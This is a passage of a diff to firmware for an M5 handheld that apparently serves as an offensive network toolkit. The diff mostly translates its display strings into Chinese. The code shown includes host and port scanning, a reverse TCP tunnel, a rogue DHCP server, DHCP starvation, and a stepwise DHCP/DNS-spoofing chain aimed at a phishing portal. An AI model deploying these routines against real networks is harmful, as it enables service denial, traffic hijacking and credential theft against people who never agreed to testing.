         scanFile = SD.open(filePath, FILE_WRITE);  // Open the file for writing
         if (!scanFile) {
-            M5.Display.println("Failed to create scan file.");
+            M5.Display.println("创建扫描文件失败");
             return;
         }
     }
@@ -16883,7 +17111,7 @@ void FullNetworkAnalysis(bool isWebCommand) {
     // Check WiFi connection
     if (WiFi.localIP().toString() == "0.0.0.0") {
         scanInProgress = false;
-        waitAndReturnToMenu("Not connected...");
+        waitAndReturnToMenu("未连接网络...");
         return;
     }
 
@@ -16895,7 +17123,7 @@ void FullNetworkAnalysis(bool isWebCommand) {
 
     // Initial display configuration
     M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
 
     gatewayIP = WiFi.gatewayIP();
     subnetMask = WiFi.subnetMask();
@@ -16905,8 +17133,8 @@ void FullNetworkAnalysis(bool isWebCommand) {
     M5.Display.clear();
     int numHosts = 254 - subnetMask[3];  // Calculate the number of hosts
     M5.Display.setCursor(5, M5.Display.height() / 2);
-    M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
-    M5.Display.println("       please wait...");
+    M5.Display.println("正在ARP探测 " + String(numHosts) + " 台主机");
+    M5.Display.println("       请稍候...");
 
     bool foundHosts = false;
 
@@ -16933,10 +17161,10 @@ void FullNetworkAnalysis(bool isWebCommand) {
     }
 
     if (!foundHosts) {
-        M5.Display.println("No hosts found.");
+        M5.Display.println("未发现主机");
         delay(2000);
         scanInProgress = false;
-        waitAndReturnToMenu("No hosts found.");
+        waitAndReturnToMenu("未发现主机");
         return;
     } else {
         logScanResult("-----------------------");
@@ -16945,7 +17173,7 @@ void FullNetworkAnalysis(bool isWebCommand) {
     // Display the number of found hosts
     M5.Display.clear();
     M5.Display.setCursor(M5.Display.width() / 2 - 60, M5.Display.height() / 2);
-    M5.Display.println(String(hostslist.size()) + " hosts found");
+    M5.Display.println("发现 " + String(hostslist.size()) + " 台主机");
     delay(2000);
 
     // Scrolling display of the hosts and scanning their ports
@@ -16955,7 +17183,7 @@ void FullNetworkAnalysis(bool isWebCommand) {
     // Close the scan file after the scan is done
     if (scanFile) {
         scanFile.close();
-        M5.Display.println("Scan results saved successfully.");
+        M5.Display.println("扫描结果已保存");
     }
 }
 
@@ -17078,12 +17306,12 @@ void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanI
 
 
     int currentHostIndex = 0;
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     bool needsDisplayUpdate = true;
 
     while (currentHostIndex < hostslist.size()) {
         IPAddress host = hostslist[currentHostIndex];
-        String hostHeader = "Host: " + host.toString();
+        String hostHeader = "主机: " + host.toString();
         scanResults.push_back("--------------------------");
         scanResults.push_back(hostHeader);
         scanResults.push_back("--------------------------");
@@ -17101,7 +17329,7 @@ void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanI
 
             if (isPortOpen) {
                 String service = portServices.count(port) ? portServices[port] : "Unknown";
-                scanResults.push_back("Port " + String(port) + " open - " + service);
+                scanResults.push_back("端口 " + String(port) + " 开放 - " + service);
                 client.stop();
                 needsDisplayUpdate = true;
                 logScanResult(host.toString() + " - " + String(port) + " - " + service);  // Enregistrer les informations de port
@@ -17122,7 +17350,7 @@ void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanI
 
         scanResults.push_back("--------------------------");
         logScanResult("--------------------------");  // Enregistrer les informations de port
-        scanResults.push_back(host.toString() + " Finished.");
+        scanResults.push_back(host.toString() + " 扫描完成");
         needsDisplayUpdate = true;
 
         if (needsDisplayUpdate) {
@@ -17138,7 +17366,7 @@ void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanI
         currentHostIndex++;
     }
     scanResults.push_back("--------------------------");
-    scanResults.push_back("Scan Terminated.");
+    scanResults.push_back("扫描已结束");
     displayResults(displayStart, maxLines, scanResults);
     if (!isWebCommand){
       while (true) {
@@ -17155,13 +17383,13 @@ void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanI
           }
           delay(30);
       }
-      if (confirmPopup("Scrape websites? (Y/N)")) {
+      if (confirmPopup("是否抓取网站? (Y/N)")) {
           M5.Display.clear();
           fetchWebsites(hostslist, openPorts, scanIndex);  // Appelle la fonction pour récupérer les sites
       }
     }
     scanInProgress = false;
-    waitAndReturnToMenu("Return to menu.");
+    waitAndReturnToMenu("返回菜单");
 }
 
 
@@ -17279,9 +17507,9 @@ void saveWebsiteContent(String folderPath, String identifier, String content) {
     if (webFile) {
         webFile.print(content);
         webFile.close();
-        statusMessage = "Scraping :";
+        statusMessage = "正在抓取:";
     } else {
-        statusMessage = "Failed :";
+        statusMessage = "抓取失败:";
     }
 
     // Effacer l'écran
@@ -17391,7 +17619,7 @@ void viewFileContent(String filePath) {
     if (!file) {
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-        M5.Display.println("Failed to open file: " + filePath);
+        M5.Display.println("打开文件失败: " + filePath);
         M5.Display.display();
         delay(2000);
         return;
@@ -17409,7 +17637,7 @@ void viewFileContent(String filePath) {
     int lineHeight = 10;
     int maxLines = M5.Display.height() / lineHeight;
     bool needsDisplayUpdate = true;
-    M5.Display.setTextSize(1.3);
+    evilSetCnFont(M5.Display, 1.3);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     
     enterDebounce();
@@ -17450,14 +17678,14 @@ void ListNetworkAnalysis() {
     if (scanFiles.empty()) {
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-        M5.Display.println("No scan files found.");
+        M5.Display.println("未找到扫描文件");
         M5.Display.display();
         delay(2000);
         return;
     }
 
     displayFileList(scanFiles);
-    waitAndReturnToMenu("Return to menu.");
+    waitAndReturnToMenu("返回菜单");
 }
 
 /*
@@ -17478,12 +17706,12 @@ bool isBackspacePressed() {
 void reverseTCPTunnel() {
 
   if (WiFi.localIP().toString() == "0.0.0.0") {
-      waitAndReturnToMenu("Not connected...");
+      waitAndReturnToMenu("未连接网络...");
       return;
   }
 
   if (tcp_host == ""){
-      waitAndReturnToMenu("Error check tcp_host in config file");
+      waitAndReturnToMenu("错误: 请检查配置中的tcp_host");
       return;
   }
   
@@ -17500,7 +17728,7 @@ void reverseTCPTunnel() {
     
     M5.Display.clear();
     M5.Display.setCursor(20, M5.Display.height() / 2);
-    M5.Display.println("Attempting to connect...");
+    M5.Display.println("正在尝试连接...");
     
     unsigned long previousAttemptTime = 0;
     const unsigned long attemptInterval = 5000;
@@ -17515,7 +17743,7 @@ void reverseTCPTunnel() {
           running = false;
           M5.Display.clear();
           M5.Display.setCursor(20, M5.Display.height() / 2);
-          M5.Display.println("Returning to menu...");
+          M5.Display.println("正在返回菜单...");
           break;
         }
 
@@ -17525,7 +17753,7 @@ void reverseTCPTunnel() {
             if (client.connect(tcp_host.c_str(), tcp_port)) {
                 M5.Display.clear();
                 M5.Display.setCursor(20, M5.Display.height() / 2);
-                M5.Display.println("Connection established.");
+                M5.Display.println("连接已建立");
                 attemptingConnection = false;
             } else {
                 if (WiFi.status() != WL_CONNECTED) {
@@ -17533,7 +17761,7 @@ void reverseTCPTunnel() {
                 }
                 M5.Display.clear();
                 M5.Display.setCursor(20, M5.Display.height() / 2);
-                M5.Display.println("Trying to connect...");
+                M5.Display.println("正在重连...");
             }
         }
     }
@@ -17542,7 +17770,7 @@ void reverseTCPTunnel() {
 
     M5.Display.clear();
     M5.Display.setCursor(30, M5.Display.height() / 2);
-    M5.Display.println("TCP tunnel Connected.");
+    M5.Display.println("TCP隧道已连接");
 
     while (client.connected() && running) {
       cardUpdate();
@@ -17560,10 +17788,10 @@ void reverseTCPTunnel() {
     client.stop();
     M5.Display.clear();
     M5.Display.setCursor(20, M5.Display.height() / 2);
-    M5.Display.println("Connection closed.");
+    M5.Display.println("连接已关闭");
     delay(1000); // Short delay for user to read the information
   }
-  waitAndReturnToMenu("Return to menu.");
+  waitAndReturnToMenu("返回菜单");
 }
 
 void handleDataTransfer(WiFiClient &client) {
@@ -17776,13 +18004,13 @@ void rogueDHCP(RogueDhcpMode mode) {
       esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
       if (ap_netif) esp_netif_dhcps_start(ap_netif);  // rollback
     }
-    waitAndReturnToMenu("Error: UDP start failed.");
+    waitAndReturnToMenu("错误: UDP启动失败");
     return;
   }
 
   M5.Display.clear(menuBackgroundColor);
   Serial.println(F("Rogue DHCP running..."));
-  updateDisplay("DHCP running...");
+  updateDisplay("DHCP运行中...");
 
   while (true) {
     M5.update();
@@ -17791,15 +18019,15 @@ void rogueDHCP(RogueDhcpMode mode) {
 
     if (kp(KEY_BACKSPACE)) {
       Serial.println(F("Returning to menu."));
-      updateDisplay("Returning...");
-      waitAndReturnToMenu("Return to menu.");
+      updateDisplay("正在返回...");
+      waitAndReturnToMenu("返回菜单");
       break;
     }
 
     int packetSizeRogue = udp.parsePacket();
     if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
       Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
-      updateDisplay("Packet received");
+      updateDisplay("收到数据包");
 
       uint8_t packetBufferRogue[512];
       udp.read(packetBufferRogue, packetSizeRogue);
@@ -17809,18 +18037,18 @@ void rogueDHCP(RogueDhcpMode mode) {
 
       if (messageTypeRogue == 1) { // DHCP Discover
         Serial.println(F("DHCP Discover received. Preparing Offer..."));
-        updateDisplay("Discover. Preparing Offer...");
+        updateDisplay("收到Discover, 准备Offer...");
         prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2, offeredIpSuffix);
         sendDHCPResponse(packetBufferRogue, packetSizeRogue, false, offeredIpSuffix);
         Serial.println(F("DHCP Offer sent."));
-        updateDisplay("Offer sent.");
+        updateDisplay("已发送Offer");
       } else if (messageTypeRogue == 3) { // DHCP Request
         Serial.println(F("DHCP Request received. Preparing ACK..."));
-        updateDisplay("Request. Preparing ACK...");
+        updateDisplay("收到Request, 准备ACK...");
         prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5, offeredIpSuffix);
         sendDHCPResponse(packetBufferRogue, packetSizeRogue, true, offeredIpSuffix);
         Serial.println(F("DHCP ACK sent."));
-        updateDisplay("ACK sent.");
+        updateDisplay("已发送ACK");
       }
     }
   }
@@ -17905,7 +18133,7 @@ void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t mes
     offeredIpSuffix = allocateIpAddress(clientMac);
     if (offeredIpSuffix == 0) {
       Serial.println(F("No available IP addresses."));
-      updateDisplay("No available IPs.");
+      updateDisplay("无可用IP");
       return;
     }
   } else if (messageTypeRogue == 5) { // ACK
@@ -17942,7 +18170,7 @@ void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t mes
       offeredIpSuffix = allocateIpAddress(clientMac);
       if (offeredIpSuffix == 0) {
         Serial.println(F("No available IP addresses."));
-        updateDisplay("No available IPs.");
+        updateDisplay("无可用IP");
         return;
       }
     }
@@ -18179,10 +18407,10 @@ void saveCurrentNetworkConfig() {
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 5);
-    M5.Display.println("Current network saved:");
+    M5.Display.println("已保存当前网络配置:");
     M5.Display.printf("IP: %s\n", currentIPStarvation.toString().c_str());
-    M5.Display.printf("Subnet: %s\n", currentSubnet.toString().c_str());
-    M5.Display.printf("Gateway: %s\n", currentGateway.toString().c_str());
+    M5.Display.printf("子网: %s\n", currentSubnet.toString().c_str());
+    M5.Display.printf("网关: %s\n", currentGateway.toString().c_str());
     M5.Display.printf("DNS: %s\n", currentDNS.toString().c_str());
     M5.Display.display();
     delay(2000);
@@ -18195,7 +18423,7 @@ void disconnectWiFi() {
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 5);
-    M5.Display.println("WiFi disconnected.");
+    M5.Display.println("WiFi已断开");
     M5.Display.display();
     delay(1000);
 }
@@ -18206,7 +18434,7 @@ void configureStaticIP() {
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         M5.Display.setCursor(5, 5);
-        M5.Display.println("Failed to configure\n static IP.");
+        M5.Display.println("配置静态IP失败");
         M5.Display.display();
         delay(2000);
     } else {
@@ -18214,7 +18442,7 @@ void configureStaticIP() {
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         M5.Display.setCursor(5, 5);
-        M5.Display.println("Static IP configured \nsuccessfully.");
+        M5.Display.println("静态IP配置成功");
         M5.Display.display();
         delay(1000);
     }
@@ -18225,7 +18453,7 @@ void reconnectWiFi(int networkIndex) {
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 5);
-    M5.Display.println("Reconnecting to WiFi...");
+    M5.Display.println("正在重连WiFi...");
     M5.Display.display();
     
     if (getWifiSecurity(networkIndex) == "Open") {
@@ -18244,7 +18472,7 @@ void reconnectWiFi(int networkIndex) {
     }
 
     Serial.println(F("\nConnected to WiFi."));
-    M5.Display.println("\nConnected to WiFi.");
+    M5.Display.println("\n已连接WiFi");
     M5.Display.display();
     delay(1000);
 }
@@ -18256,8 +18484,8 @@ void detectDHCPServer() {
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 5);
-    M5.Display.println("Detecting DHCP server...");
-    M5.Display.println("Press ENTER to cancel");
+    M5.Display.println("正在探测DHCP服务器...");
+    M5.Display.println("按回车键取消");
     M5.Display.display();
     dhcpServerDetected = false;
 
@@ -18269,7 +18497,7 @@ void detectDHCPServer() {
             Serial.println(F("Detection cancelled by user"));
             M5.Display.clear(menuBackgroundColor);
             M5.Display.setCursor(5, 5);
-            M5.Display.printf("Detection cancelled");
+            M5.Display.printf("已取消探测");
             M5.Display.display();
             delay(2000);
             return;
@@ -18298,7 +18526,7 @@ void detectDHCPServer() {
                 }
                 
                 Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
-                M5.Display.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());
+                M5.Display.printf("发现DHCP服务器:\n%s\n", dhcpServerIP.toString().c_str());
                 M5.Display.display();
                 dhcpServerDetected = true;
                 delay(2000);
@@ -18313,9 +18541,9 @@ void detectDHCPServer() {
           dhcpServerIP = currentGateway;
           Serial.println(F("No DHCP server detected. Using gateway as fallback."));
           M5.Display.clear(BLACK);
-          M5.Display.println("No DHCP server found.");
-          M5.Display.println("Using gateway as fallback:");
-          M5.Display.printf("Gateway: %s\n", dhcpServerIP.toString().c_str());
+          M5.Display.println("未发现DHCP服务器");
+          M5.Display.println("使用网关作为回退:");
+          M5.Display.printf("网关: %s\n", dhcpServerIP.toString().c_str());
           M5.Display.display();
           delay(2000);
         }
@@ -18330,7 +18558,7 @@ int NAKNumberStarvation = 50;
 
 void startDHCPStarvation() {
       if (WiFi.localIP().toString() == "0.0.0.0") {
-        waitAndReturnToMenu("Not connected...");
+        waitAndReturnToMenu("未连接网络...");
         return;
     }
 
@@ -18346,7 +18574,7 @@ void startDHCPStarvation() {
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         M5.Display.setCursor(5, 5);
-        M5.Display.println("Error: Total IPs\ncalculated as zero.\nsettings to 255");
+        M5.Display.println("错误: IP总数为0\n已设为255");
         totalIPs == 255;
         M5.Display.display();
         delay(2000);
@@ -18361,7 +18589,7 @@ void startDHCPStarvation() {
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         M5.Display.setCursor(5, 5);
-        M5.Display.println("Error: Failed to init \nUDP socket");
+        M5.Display.println("错误: 初始化UDP失败");
         M5.Display.display();
         delay(2000);
         return;
@@ -18371,8 +18599,8 @@ void startDHCPStarvation() {
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 5);
-    M5.Display.println("System initialized");
-    M5.Display.println("Starting DHCP detection...");
+    M5.Display.println("系统已初始化");
+    M5.Display.println("开始探测DHCP...");
     M5.Display.display();
     delay(1000);
 
@@ -18382,16 +18610,16 @@ void startDHCPStarvation() {
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         M5.Display.setCursor(5, 5);
-        M5.Display.println("Starvation running on:");
-        M5.Display.printf("DHCP server:\n%s\n", dhcpServerIP.toString().c_str());
+        M5.Display.println("DHCP饥饿攻击目标:");
+        M5.Display.printf("DHCP服务器:\n%s\n", dhcpServerIP.toString().c_str());
         M5.Display.display();
     } else {
         Serial.println(F("No DHCP server detected. Trying with broadcast."));
         M5.Display.clear(menuBackgroundColor);
         M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
         M5.Display.setCursor(5, 5);
-        M5.Display.println("Starvation running on:");
-        M5.Display.printf("Unknow DHCP server");
+        M5.Display.println("DHCP饥饿攻击目标:");
+        M5.Display.printf("未知DHCP服务器");
         M5.Display.display();
     }
 
@@ -18402,7 +18630,7 @@ void startDHCPStarvation() {
                 
         if (kp(KEY_ENTER)) {
             Serial.println(F("Attack stopped by user"));
-            M5.Display.println("Attack stopped");
+            M5.Display.println("攻击已停止");
             M5.Display.display();
             delay(1000);
             break;
@@ -18416,13 +18644,13 @@ void startDHCPStarvation() {
        // Update display with statistics
         M5.Display.fillRect(0, 40, M5.Display.width(), 40, menuBackgroundColor);
         M5.Display.setCursor(5, 40);
-        M5.Display.printf("Pool percentage: %d%%\n", percentage);
-        M5.Display.printf("Send Discover: %d\n", discoverCount);
-        M5.Display.printf("Received Offer: %d\n", offerCount);
-        M5.Display.printf("Send Request: %d\n", requestCount);
-        M5.Display.printf("Received ACK: %d\n", ackCount);
-        M5.Display.printf("Received NAK: %d\n", nakCount);
-        M5.Display.print("Last IP:");
+        M5.Display.printf("地址池占用: %d%%\n", percentage);
+        M5.Display.printf("已发Discover: %d\n", discoverCount);
+        M5.Display.printf("已收Offer: %d\n", offerCount);
+        M5.Display.printf("已发Request: %d\n", requestCount);
+        M5.Display.printf("已收ACK: %d\n", ackCount);
+        M5.Display.printf("已收NAK: %d\n", nakCount);
+        M5.Display.print("最新IP:");
         M5.Display.print(lastAssignedIP.toString().c_str());
         M5.Display.print("        ");
         M5.Display.display();
@@ -18433,7 +18661,7 @@ void startDHCPStarvation() {
             M5.Display.clear(menuBackgroundColor);
             M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
             M5.Display.setCursor(5, 30);
-            M5.Display.println("DHCP Starvation Stopped.\n\nThe number of NAK suggest\na successfull DHCP \nStarvation !!!");
+            M5.Display.println("DHCP饥饿攻击已停止\n\nNAK数量表明\nDHCP地址池已耗尽!!!");
             M5.Display.display();
             delay(4000);
     }
@@ -18441,16 +18669,16 @@ void startDHCPStarvation() {
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 30);
-    M5.Display.println("DHCP Starvation Stopped.");
-    M5.Display.printf("Pool percentage: %d%%\n", percentage);
-    M5.Display.printf("Total Discover: %d\n", discoverCount);
-    M5.Display.printf("Total Offer: %d\n", offerCount);
-    M5.Display.printf("Total Request: %d\n", requestCount);
-    M5.Display.printf("Total ACK: %d\n", ackCount);
-    M5.Display.printf("Total NAK: %d\n", nakCount);
+    M5.Display.println("DHCP饥饿攻击已停止");
+    M5.Display.printf("地址池占用: %d%%\n", percentage);
+    M5.Display.printf("Discover总计: %d\n", discoverCount);
+    M5.Display.printf("Offer总计: %d\n", offerCount);
+    M5.Display.printf("Request总计: %d\n", requestCount);
+    M5.Display.printf("ACK总计: %d\n", ackCount);
+    M5.Display.printf("NAK总计: %d\n", nakCount);
     M5.Display.display();
     delay(4000);
-    waitAndReturnToMenu("Return to menu");
+    waitAndReturnToMenu("返回菜单");
 }
 
 static const uint8_t knownOUI[/*n*/][3] PROGMEM = {
@@ -18609,7 +18837,7 @@ void sendDHCPDiscover(uint8_t *mac) {
   } else {
     Serial.println(F("Failed to send DHCP Discover."));
     M5.Display.setCursor(5, M5.Display.height() - 40);
-    M5.Display.println("Failed to send DHCP Discover");
+    M5.Display.println("发送DHCP Discover失败");
     M5.Display.display();
   }
 }
@@ -18719,7 +18947,7 @@ void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) 
   } else {
     Serial.println(F("Failed to send DHCP Request."));
     M5.Display.setCursor(5, M5.Display.height() - 40);
-    M5.Display.println("Failed to send DHCP Request");
+    M5.Display.println("发送DHCP Request失败");
     M5.Display.display();
   }
 }
@@ -18812,7 +19040,7 @@ void switchDNS() {
   Serial.println(newIP);
 
   // Build the message with the current DNS IP
-  String message = "DNS reset, new IP: " + newIP.toString();
+  String message = "DNS已重置, 新IP: " + newIP.toString();
   waitAndReturnToMenu(message.c_str());  // Pass the message as an argument
 }
 
@@ -18832,7 +19060,7 @@ void rogueDHCPAuto() {
 
   M5.Display.clear(menuBackgroundColor);
   Serial.println(F("Rogue DHCP running..."));
-  updateDisplay("DHCP running...");
+  updateDisplay("DHCP运行中...");
 
   unsigned long startTime = millis(); // Enregistrer le temps de début
 
@@ -18844,7 +19072,7 @@ void rogueDHCPAuto() {
     int packetSizeRogue = udp.parsePacket();
     if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
       Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
-      updateDisplay("Packet received");
+      updateDisplay("收到数据包");
 
       uint8_t packetBufferRogue[512];
       udp.read(packetBufferRogue, packetSizeRogue);
@@ -18854,49 +19082,49 @@ void rogueDHCPAuto() {
       
       if (messageTypeRogue == 1) { // DHCP Discover
         Serial.println(F("DHCP Discover received. Preparing Offer..."));
-        updateDisplay("Discover. Preparing Offer...");
+        updateDisplay("收到Discover, 准备Offer...");
       
         prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2, offeredIpSuffix);
       
         // Send the DHCP Offer (broadcast)
         sendDHCPResponse(packetBufferRogue, packetSizeRogue, false, offeredIpSuffix);
         Serial.println(F("DHCP Offer sent."));
-        updateDisplay("Offer sent.");
+        updateDisplay("已发送Offer");
       
       } else if (messageTypeRogue == 3) { // DHCP Request
         Serial.println(F("DHCP Request received. Preparing ACK..."));
-        updateDisplay("Request. Preparing ACK...");
+        updateDisplay("收到Request, 准备ACK...");
       
         prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5, offeredIpSuffix);
       
         // Send the DHCP ACK (unicast vers client)
         sendDHCPResponse(packetBufferRogue, packetSizeRogue, true, offeredIpSuffix);
         Serial.println(F("DHCP ACK sent."));
-        updateDisplay("ACK sent.");
+        updateDisplay("已发送ACK");
       }
 
     }
   }
-  updateDisplay("Rogue DHCP stopped.");
+  updateDisplay("伪造DHCP已停止");
 }
 
 
 void DHCPAttackAuto(){
   bool DHCPDNSExplain = false;
-  if (confirmPopup("Some explanation ?")){
+  if (confirmPopup("查看攻击说明?")){
     DHCPDNSExplain = true;
   }
   if (DHCPDNSExplain){
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 20);
-    M5.Display.println("Step 1 : DHCP Starvation.");
-    M5.Display.println("Send multiple fake new");
-    M5.Display.println("client to saturate the");
-    M5.Display.println("the pool of available");
-    M5.Display.println("IP address that DHCP can"); 
-    M5.Display.println("provide. NAK = Starvation");
-    M5.Display.println("Press Enter to start");
+    M5.Display.println("步骤1: DHCP饥饿攻击");
+    M5.Display.println("发送大量伪造客户端请求");
+    M5.Display.println("以耗尽DHCP服务器可用");
+    M5.Display.println("IP地址池。");
+    M5.Display.println("收到NAK代表地址池耗尽。"); 
+    M5.Display.println("");
+    M5.Display.println("按回车键开始");
     M5.Display.display();
     while (!kp(KEY_ENTER)){
       M5.update();
@@ -18910,13 +19138,13 @@ void DHCPAttackAuto(){
       M5.Display.clear(menuBackgroundColor);
       M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
       M5.Display.setCursor(5, 20);
-      M5.Display.println("Step 2 : Rogue DHCP.");
-      M5.Display.println("The Original DHCP cant");
-      M5.Display.println("provide new IP so we");
-      M5.Display.println("now answering any DHCP");
-      M5.Display.println("request with hijacked");
-      M5.Display.println("DNS that at evil IP.");
-      M5.Display.println("Press Enter to start");
+      M5.Display.println("步骤2: 伪造DHCP服务");
+      M5.Display.println("原DHCP已无法分配新IP，");
+      M5.Display.println("现在由本机响应DHCP请求");
+      M5.Display.println("并下发劫持后的恶意DNS");
+      M5.Display.println("服务器IP地址。");
+      M5.Display.println("");
+      M5.Display.println("按回车键开始");
       M5.Display.display();
     while (!kp(KEY_ENTER)){
       M5.update();
@@ -18930,13 +19158,13 @@ void DHCPAttackAuto(){
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 20);
-    M5.Display.println("Step 3 : Start the Web");
-    M5.Display.println("server with DNS Spoofing.");
-    M5.Display.println("Start the portal to");
-    M5.Display.println("provide page and DNS.");
-    M5.Display.println("The DNS spoof any request");
-    M5.Display.println("to redirect to the evil.");
-    M5.Display.println("Press Enter to start");
+    M5.Display.println("步骤3: 启动Web与DNS欺骗");
+    M5.Display.println("启动认证门户以提供网页");
+    M5.Display.println("与DNS服务。");
+    M5.Display.println("DNS欺骗会将所有域名请求");
+    M5.Display.println("重定向至本机钓鱼页面。");
+    M5.Display.println("");
+    M5.Display.println("按回车键开始");
     M5.Display.display();
     while (!kp(KEY_ENTER)){
       M5.update();
@@ -18950,11 +19178,11 @@ void DHCPAttackAuto(){
     M5.Display.clear(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
     M5.Display.setCursor(5, 20);
-    M5.Display.println("Step 4 : Change DNS IP.");
-    M5.Display.println("Changing DNS IP with");
-    M5.Display.println("local IP address to");
-    M5.Display.println("provide Spoffed DNS query.");
-    M5.Display.println("Press Enter to change");
+    M5.Display.println("步骤4: 切换DNS IP");
+    M5.Display.println("将DNS服务器IP切换为");
+    M5.Display.println("本机局域网IP以响应欺骗");
+    M5.Display.println("DNS查询请求。");
+    M5.Display.println("按回车键切换");
     M5.Display.display();
     while (!kp(KEY_ENTER)){
       M5.update();
@@ -19004,10 +19232,10 @@ bool validateBaseIP(const String& baseIP) {
 String getNetworkBase() {
     String baseIP = "";
     M5.Display.clear();
-    M5.Display.setTextSize(1.5);
+    evilSetCnFont(M5.Display, 1.5);
     M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
     M5.Display.setCursor(5, 5);
-    M5.Display.println("Enter base IP (192.168.1):");
+    M5.Display.println("输入基础IP网段 (192.168.1):");
     M5.Display.setCursor(5, 50);
 
     while (true) {
@@ -19026,11 +19254,11 @@ String getNetworkBase() {
             return baseIP;
         } else {
             M5.Display.setCursor(5, 80);
-            M5.Display.println("Invalid format! Retry.");
+            M5.Display.println("格式无效！请重试。");
             delay(2000);
             M5.Display.clear();
             M5.Display.setCursor(5, 5);
-            M5.Display.println("Enter base IP (192.168.1):");
+            M5.Display.println("输入基础IP网段 (192.168.1):");
         }
     }
 }
@@ -19038,7 +19266,7 @@ String getNetworkBase() {
 void detectPrinter() {
     if (WiFi.localIP().toString() == "0.0.0.0") {
         Serial.println(F("[INFO] Not connected to a network."));
-        waitAndReturnToMenu("Not connected to a network.");
+        waitAndReturnToMenu("未连接到网络。");
         return;
     }
 
@@ -19050,7 +19278,7 @@ void detectPrinter() {
     Serial.println("[INFO] Network base IP: " + String(base_ip));
     M5.Display.clear();
     M5.Display.setCursor(5, 20);
-    M5.Display.println("Scanning for printers...");
+    M5.Display.println("正在扫描打印机...");
     M5.Display.display();
 
     detectedPrinters.clear();
@@ -19072,7 +19300,7 @@ void detectPrinter() {
         // Progress update
         if (i % 10 == 0) {
             M5.Display.setCursor(5, 40);
-            M5.Display.printf("Scanned %d/254 IPs...\n", i);
+            M5.Display.printf("已扫描 %d/254 个IP...\n", i);
             M5.Display.display();
         }
     }
@@ -19081,13 +19309,13 @@ void detectPrinter() {
     M5.Display.clear();
     if (detectedPrinters.empty()) {
         M5.Display.setCursor(5, 20);
-        M5.Display.println("No printers detected.");
-        M5.Display.println("Returning to menu...");
+        M5.Display.println("未检测到打印机。");
+        M5.Display.println("正在返回菜单...");
         M5.Display.display();
         Serial.println(F("[INFO] No printers detected."));
     } else {
         M5.Display.setCursor(5, 20);
-        M5.Display.println("Printers found:");
+        M5.Display.println("发现的打印机:");
         for (const auto &printerIP : detectedPrinters) {
             Serial.println(" - " + printerIP.toString());
             M5.Display.println(printerIP.toString());
@@ -19096,13 +19324,13 @@ void detectPrinter() {
     }
 
     delay(2000);
-    waitAndReturnToMenu("return to menu");
+    waitAndReturnToMenu("返回菜单");
 }
 
 void printFile() {
       if (WiFi.localIP().toString() == "0.0.0.0") {
         Serial.println(F("[INFO] Not connected to a network."));
-        waitAndReturnToMenu("Not connected to a network.");
+        waitAndReturnToMenu("未连接到网络。");
         return;
     }
     // File path to print and printer IP configuration
@@ -19115,9 +19343,9 @@ void printFile() {
     if (!SD.exists(filePath)) {
         M5.Display.clear();
